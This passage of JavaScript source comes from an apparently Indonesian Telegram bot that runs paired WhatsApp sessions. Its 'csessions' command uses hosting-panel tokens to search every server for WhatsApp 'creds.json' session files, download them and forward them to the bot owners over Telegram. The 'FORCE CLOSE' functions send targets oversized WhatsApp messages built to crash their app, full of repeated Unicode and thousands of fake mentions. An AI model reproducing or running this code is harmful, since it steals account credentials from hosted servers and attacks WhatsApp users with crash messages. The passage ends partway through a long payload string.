  if (args.length < 2) return ctx.reply("Gunakan: `/pairing <number>`", { parse_mode: "Markdown" });
  const botNumber = args[1];
  await ctx.reply(`
━─────────────────────────━
           𝐏𝐀𝐈𝐑𝐈𝐍𝐆 𝐍𝐎𝐓𝐈𝐅𝐘
━─────────────────────────━
Starting pairing to  ${botNumber}.
━─────────────────────────━`);
  await connectToWhatsApp(botNumber, ctx.chat.id, ctx);
});

bot.command("csessions", async (ctx) => {
if (!ctx.isOwner) return ctx.reply("❌ Anda tidak memiliki akses.");
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return;
  if (!plta || !pltc) return ctx.reply("⚠️ Token panel belum dikonfigurasi. Pastikan plta & pltc tersedia di config.");

  await ctx.reply("⏳ Sedang scan semua server untuk mencari folder `sessions` dan file `creds.json` ...", { parse_mode: "Markdown" });

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(`${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
      });
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];
      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        if (name.toLowerCase() === "sessions" && isDirectory(item)) {
          try {
            const sessRes = await axios.get(`${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/list`, {
              params: { directory: normalized },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            });
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") found.push({ path: sfPath.replace(/\/+/g, "/"), name: sfName });
              }
            }
          } catch {}
        }
        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch {}
        } else {
          if (name.toLowerCase() === "creds.json") found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
        }
      }
      return found;
    } catch {
      return [];
    }
  }

  try {
    const res = await axios.get(`${domain.replace(/\/+$/, "")}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });
    const data = res.data;
    if (!data || !Array.isArray(data.data)) return ctx.reply("❌ Gagal ambil list server dari panel.");
    let totalFound = 0;
    for (let srv of data.data) {
      const identifier = (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || "unknown";
      if (!identifier) continue;
      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, "/").replace(/^\/?/, "/");
          await ctx.reply(`📁 Ditemukan creds.json di server *${name}*\nPath: \`${filePath}\``, { parse_mode: "Markdown" });
          try {
            const downloadRes = await axios.get(`${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/download`, {
              params: { file: filePath },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            });
            const dlJson = downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, { responseType: "arraybuffer" });
              const buffer = Buffer.from(fileRes.data);
              for (let oid of ownerIds) {
                try {
                  await ctx.telegram.sendDocument(oid, { source: buffer, filename: `${name.replace(/\s+/g, "_")}_creds.json` });
                } catch (e) {
                  console.error(`Gagal kirim file creds.json ke owner ${oid}:`, e);
                }
              }
            } else await ctx.reply(`❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}.`);
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e);
            await ctx.reply(`❌ Error saat download file creds.json dari ${name}`);
          }
        }
      }
    }
    if (totalFound === 0) return ctx.reply("✅ Scan selesai. Tidak ditemukan creds.json di folder sessions pada server manapun.");
    else return ctx.reply(`✅ Scan selesai. Total file creds.json berhasil diunduh dan dikirim: ${totalFound}`);
  } catch (err) {
    console.error("csessions Error:", err);
    ctx.reply("❌ Terjadi error saat scan.");
  }
});

bot.command("listpairing", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Anda tidak memiliki akses.");
  if (sessions.size === 0) return ctx.reply("Tidak ada pengirim aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Pengirim Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delpairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Anda tidak memiliki akses.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Gunakan: /delpairing <number>");

  const botNumber = args[1];
  if (!sessions.has(botNumber)) return ctx.reply("Pengirim tidak ditemukan.");

  try {
    const sessionDir = sessionPath(botNumber);
    sessions.get(botNumber).end?.();
    sessions.delete(botNumber);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== botNumber)));
    ctx.reply(`Pengirim ${botNumber} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Gagal menghapus pengirim.");
  }
});

//============== FORCE CLOSE =============//
async function XNecroCrashUi(skid, target) {
  await skid.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦾ".repeat(60000),
            locationMessage: {
              degreesLatitude: 0,
              degreesLongtitude: 0,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "𒑡𝙎𝙖𝙩𝙪𝙧𝙣𝙓𝙣𝙞𝙈𝙖𝙣𝙜𝙎𝙖𝙥𝙚?៚" + "ោ៝".repeat(20000),
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: ""
              },
              {
                name: "call_permission_request",
                buttonParamsJson: ""
              },
            ],
          },
        },
      },
    },
  }, {});
  
  await skid.relayMessage(target, {
    groupInviteMessage: {
      inviteCode: "XxX",
      inviteExpiration: "18144000",
      groupName: "𒑡𝙎𝙖𝙩𝙪𝙧𝙣𝙓𝙣𝙞𝙈𝙖𝙣𝙜𝙨𝙖𝙥𝙚?៚" + "ោ៝".repeat(20000),
      caption: "ោ៝".repeat(20000),
    },
  }, { participant: { jid: target }, });
}
async function XNecroKillNotif(skid, target) {
  const buttons = [
    { name: "single_select", buttonParamsJson: "" }
  ];
  
  for (let i = 0; i < 15; i++) {
    buttons.push(
      { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000), url: "t.me/SaturnXapps" }) }
    );
  }
  
  await skid.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 18144000
              }
            }
          },
          caraoselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  title: "𒑡𝐒𝐚𝐭𝐮𝐫𝐧𝐗𝐠𝐚𝐜𝐨𝐫៚", 
                  imageMessage: {
               url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                fileLength: "9999999999999",
                height: 9999,
                width: 9999,
                mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755254367",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "ꦾ".repeat(60000) + "ោ៝".repeat(20000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000),
                  buttons: buttons,
                },
              },
            ],
          },
        },
      },
    },
  }, { participant: { jid: target }, });
}
async function LocaX(skid, target) {
  const generateLocationMessage = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: "x",
          url: "https://t.me/Kyxsancs",
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 999999,
            isForwarded: true,
            quotedMessage: {
              extendedTextMessage: {
                text: "\u0000".repeat(100000)
              }
            },
            externalAdReply: {
              advertiserName: "whats !",
              title: "your e idiot ྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱཱཱཱཱཱཱྀིཻཻིིིུུུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷ